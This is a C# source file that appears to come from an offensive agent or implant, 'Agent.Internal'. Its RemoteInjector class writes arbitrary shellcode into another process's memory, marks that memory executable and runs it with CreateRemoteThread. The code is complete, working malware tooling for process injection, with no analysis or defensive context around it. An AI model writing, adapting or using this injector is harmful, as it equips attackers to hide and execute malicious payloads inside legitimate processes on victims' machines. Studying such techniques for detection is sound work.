using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public class RemoteInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            var target = Process.GetProcessById(pid);
            var baseAddr = Native.Kernel32.VirtualAllocEx(
                target.Handle,
                IntPtr.Zero,
                (uint)shellcode.Length,
                (uint)Native.Kernel32.AllocationType.MEM_COMMIT | (uint)Native.Kernel32.AllocationType.MEM_RESERVE,
                (uint)Native.Kernel32.AllocationProtect.PAGE_READWRITE);

            if (baseAddr == IntPtr.Zero)
                return false;

            if (!Native.Kernel32.WriteProcessMemory(
                target.Handle,
                baseAddr,
                shellcode,
                shellcode.Length,
                out _))
                return false;

            if (!Native.Kernel32.VirtualProtectEx(target.Handle, baseAddr, shellcode.Length, (uint)Native.Kernel32.AllocationProtect.PAGE_EXECUTE_READ, out _))
                return false;

            Native.Kernel32.CreateRemoteThread(target.Handle, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out var threadId);
            return threadId != IntPtr.Zero;
        }
    }
}
